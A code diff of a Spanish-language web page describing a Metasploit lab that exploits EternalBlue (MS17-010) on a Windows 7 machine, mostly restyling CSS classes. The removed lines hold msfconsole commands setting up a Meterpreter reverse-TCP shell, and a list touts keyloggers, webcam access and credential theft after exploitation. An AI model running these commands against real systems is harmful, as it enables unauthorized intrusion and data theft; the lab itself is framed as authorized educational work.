@@ -19,9 +19,8 @@ export default function MetasploitLab() {
       <div className="bg-card rounded-lg p-6 mb-8 shadow-lg">
         <h2 className="text-2xl font-semibold mb-4">Objetivo Principal</h2>
         {/* Línea divisoria */}
-        <hr className="mb-6 border-t border-gray-700" />
-        {/* Cambiado a text-white */}
-        <p className="text-white text-justify">
+        <hr className="mb-6 border-t border-border" />
+        <p className="text-foreground text-justify">
           Este laboratorio detalla el proceso de explotación de una vulnerabilidad en un sistema operativo
           Windows 7 utilizando la herramienta Metasploit Framework. El objetivo es demostrar la capacidad
           de identificar, explotar y obtener acceso a un sistema vulnerable, así como realizar acciones
@@ -37,8 +36,7 @@ export default function MetasploitLab() {
         <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
           <div className="bg-card p-6 rounded-lg">
             <h3 className="text-xl font-semibold mb-2">Máquina Atacante</h3>
-            {/* Cambiado a text-white */}
-            <ul className="list-disc pl-6 space-y-2 text-white">
+            <ul className="list-disc pl-6 space-y-2 text-foreground">
               <li>Sistema Operativo: Kali Linux</li>
               <li>Herramientas: Metasploit Framework</li>
               <li>IP: 192.168.88.128</li>
@@ -46,8 +44,7 @@ export default function MetasploitLab() {
           </div>
           <div className="bg-card p-6 rounded-lg">
             <h3 className="text-xl font-semibold mb-2">Máquina Víctima</h3>
-            {/* Cambiado a text-white */}
-            <ul className="list-disc pl-6 space-y-2 text-white">
+            <ul className="list-disc pl-6 space-y-2 text-foreground">
               <li>Sistema Operativo: Windows 7 Ultimate SP1</li>
               <li>Versión: 6.1.7601</li>
               <li>IP: 192.168.88.129</li>
@@ -62,16 +59,14 @@ export default function MetasploitLab() {
         {/* Línea divisoria */}
         <hr className="mb-6 border-t border-gray-700" />
         {/* Cambiado a text-white */}
-        <p className="text-white mb-4">
+        <p className="text-foreground mb-4">
           Verificación de conectividad entre la máquina atacante y la víctima:
         </p>
 
         <div className="grid grid-cols-1 gap-6">
-          {/* Verificación en Windows */}
           <div>
             <h3 className="text-xl font-semibold mb-2">Verificación en Windows 7 (Víctima)</h3>
-            {/* Cambiado a text-white */}
-            <p className="text-white mb-4">
+            <p className="text-foreground mb-4">
               Obtenemos la dirección IP del sistema usando ipconfig:
             </p>
             <Image
@@ -88,8 +83,7 @@ export default function MetasploitLab() {
             <h3 className="text-xl font-semibold mb-2">Verificación en Kali Linux (Atacante)</h3>
             <div className="space-y-4">
               <div>
-                {/* Cambiado a text-white */}
-                <p className="text-white mb-2">Iniciando msfconsole:</p>
+                <p className="text-foreground mb-2">Iniciando msfconsole:</p>
                 <Image
                   src="/lab1/metasploit/0.png"
                   alt="Inicio de msfconsole"
@@ -100,8 +94,7 @@ export default function MetasploitLab() {
               </div>
 
               <div>
-                {/* Cambiado a text-white */}
-                <p className="text-white mb-2">Verificación de red y conectividad:</p>
+                <p className="text-foreground mb-2">Verificación de red y conectividad:</p>
                 <Image
                   src="/lab1/metasploit/3.png"
                   alt="Verificación de red"
@@ -117,89 +110,50 @@ export default function MetasploitLab() {
         {/* Explotación */}
         <div>
           <h2 className="text-2xl font-semibold mb-4">3. Explotación de la Vulnerabilidad MS17-010 (EternalBlue)</h2>
-          {/* Línea divisoria */}
-          <hr className="mb-6 border-t border-gray-700" />
-          {/* Cambiado a text-white */}
-          <p className="text-white mb-4">
+          <hr className="mb-6 border-t border-border" />
+          <p className="text-foreground mb-4">
             Configuración y ejecución del exploit EternalBlue:
           </p>
-          <div className="space-y-6">
-            <div>
-              <h3 className="text-xl font-semibold mb-2">Configuración del Exploit</h3>
-              <Image
-                src="/lab1/metasploit/configuramos el exploit.png"
-                alt="Configuración del exploit"
-                width={800}
-                height={450}
-                className="rounded-lg shadow-md mb-4"
-              />
-              <div className="bg-muted p-4 rounded-md mb-4">
-                <pre className="text-sm text-white"> {/* El texto del código también será blanco */}
-                  <code>
-                    use exploit/windows/smb/ms17_010_eternalblue{'\n'}
-                    set RHOSTS 192.168.88.129{'\n'}
-                    set LHOST 192.168.88.128{'\n'}
-                    set payload windows/x64/meterpreter/reverse_tcp{'\n'}
-                    exploit
-                  </code>
-                </pre>
+
+          <div>
+            <h2 className="text-2xl font-semibold mb-4">4. Post-Explotación</h2>
+            <hr className="mb-6 border-t border-border" />
+            <p className="text-foreground mb-4">
+              Acciones realizadas después de obtener acceso al sistema:
+            </p>
+            <div className="space-y-6">
+              <div>
+                <h3 className="text-xl font-semibold mb-2">Información del Sistema</h3>
+                <Image
+                  src="/lab1/metasploit/lanzamos el primer ataque para ver la info del sistema.png"
+                  alt="Información del sistema"
+                  width={800}
+                  height={450}
+                  className="rounded-lg shadow-md mb-4"
+                />
               </div>
-            </div>
 
-            <div>
-              <h3 className="text-xl font-semibold mb-2">Ejecución Exitosa</h3>
-              <Image
-                src="/lab1/metasploit/exploit listo para usar.png"
-                alt="Exploit ejecutado con éxito"
-                width={800}
-                height={450}
-                className="rounded-lg shadow-md mb-4"
-              />
-            </div>
-          </div>
-        </div>
+              <div>
+                <h3 className="text-xl font-semibold mb-2">Captura de Pantalla Remota</h3>
+                <Image
+                  src="/lab1/metasploit/segundo ataque, screenshot, pantallazo a la pantalla del equipo de la victima.png"
+                  alt="Captura de pantalla del sistema víctima"
+                  width={800}
+                  height={450}
+                  className="rounded-lg shadow-md mb-4"
+                />
+              </div>
 
-        {/* Post-Explotación */}
-        <div>
-          <h2 className="text-2xl font-semibold mb-4">4. Post-Explotación</h2>
-          {/* Línea divisoria */}
-          <hr className="mb-6 border-t border-gray-700" />
-          {/* Cambiado a text-white */}
-          <p className="text-white mb-4">
-            Acciones realizadas después de obtener acceso al sistema:
-          </p>
-          <div className="space-y-6">
-            <div>
-              <h3 className="text-xl font-semibold mb-2">Información del Sistema</h3>
-              <Image
-                src="/lab1/metasploit/lanzamos el primer ataque para ver la info del sistema.png"
-                alt="Información del sistema"
-                width={800}
-                height={450}
-                className="rounded-lg shadow-md mb-4"
-              />
-            </div>
-
-            <div>
-              <h3 className="text-xl font-semibold mb-2">Captura de Pantalla Remota</h3>
-              <Image
-                src="/lab1/metasploit/segundo ataque, screenshot, pantallazo a la pantalla del equipo de la victima.png"
-                alt="Captura de pantalla del sistema víctima"
-                width={800}
-                height={450}
-                className="rounded-lg shadow-md mb-4"
-              />
-            </div>
-
-            <div>
-              <h3 className="text-xl font-semibold mb-2">Shell del Sistema</h3>
-              <Image
-                src="/lab1/metasploit/tercer ataque, shell,escalamiento de privilegios.png"
-                alt="Shell del sistema"
-                width={800}
-                height={450}
-                className="rounded-lg shadow-md mb-4"
-              />
+              <div>
+                <h3 className="text-xl font-semibold mb-2">Shell del Sistema</h3>
+                <Image
+                  src="/lab1/metasploit/tercer ataque, shell,escalamiento de privilegios.png"
+                  alt="Shell del sistema"
+                  width={800}
+                  height={450}
+                  className="rounded-lg shadow-md mb-4"
+                />
+              </div>
             </div>
           </div>
         </div>
@@ -207,14 +161,11 @@ export default function MetasploitLab() {
         {/* ¿Por qué este método es mejor que Armitage? */}
         <div>
           <h3 className="text-2xl font-semibold mb-4">¿Por qué este método es mejor que Armitage?</h3>
-          {/* Línea divisoria */}
-          <hr className="mb-6 border-t border-gray-700" />
-          {/* Cambiado a text-white */}
-          <p className="text-white mb-4">
+          <hr className="mb-6 border-t border-border" />
+          <p className="text-foreground mb-4">
             Aclarando dudas sobre el porque usar Metasploit en lugar de Armitage:
           </p>
-          {/* Cambiado a text-white en los <li> */}
-          <ul className="list-disc pl-6 space-y-1 text-white">
+          <ul className="list-disc pl-6 space-y-1 text-foreground">
             <li>Control Total y Precisión: Usando Metasploit directamente con comandos (msfconsole) tienes control fino de cada parámetro, payload, target, y explotación.</li>
             <li>Mejor Post-explotación: Con Meterpreter puedes hacer todo el post-exploit pro: keyloggers, webcam, VNC, escalamiento, robo de credenciales, etc.</li>
             <li>Mayor compatibilidad: Meterpreter se adapta mejor a entornos reales (x64, antivirus, firewalls, etc).</li>
@@ -226,8 +177,7 @@ export default function MetasploitLab() {
         {/* Aviso Legal */}
         <div className="bg-destructive/10 p-6 rounded-lg mt-8">
           <h4 className="text-lg font-semibold mb-2 text-destructive">⚠️ Aviso Legal Importante</h4>
-          {/* Cambiado a text-white */}
-          <p className="text-white">
+          <p className="text-foreground">
             Este laboratorio debe realizarse únicamente en un entorno controlado y con permiso explícito.
             La explotación no autorizada de sistemas puede tener graves consecuencias legales. El objetivo
             es puramente educativo para comprender el funcionamiento de las vulnerabilidades y mejorar las
